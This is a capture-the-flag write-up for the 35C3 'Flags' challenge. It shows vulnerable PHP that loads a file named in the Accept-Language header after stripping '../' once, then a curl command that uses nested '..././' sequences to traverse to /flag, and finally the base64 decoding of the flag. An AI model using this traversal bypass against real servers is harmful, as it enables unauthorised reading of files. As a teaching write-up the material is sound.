
# Challenge Flags

## Challenge

Fun with flags: http://35.207.169.47

Flag is at /flag

Difficulty estimate: Easy


## Solution

If we navigate to the given url the following PHP code is presented to us.

```
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

We figured out it must be in / of the webserver.

We can put a path in the Accept-Language header of the GET request, but '../' is escaped. Therefore a bit of creativity is needed: 

```
# curl -H 'Accept-Language: ..././..././..././..././..././..././flag' http://35.207.169.47/
```

The HTML in the response contains an image with our flag:

```
<img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
```

Since the data is encoded, we need to decode it:
```
# echo 'MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=' | base64 --decode
35c3_this_flag_is_the_be5t_fl4g
```

